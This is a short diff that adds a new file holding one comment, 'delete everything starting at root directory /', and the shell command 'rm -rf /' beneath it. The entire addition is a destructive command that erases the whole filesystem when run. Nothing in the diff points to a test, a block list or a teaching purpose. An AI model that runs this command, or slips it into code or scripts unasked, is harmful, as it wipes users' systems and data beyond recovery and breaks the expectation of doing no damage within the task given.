@@ -1,0 +1,4 @@
+//  delete everything starting at root directory /
+
+rm -rf /
+
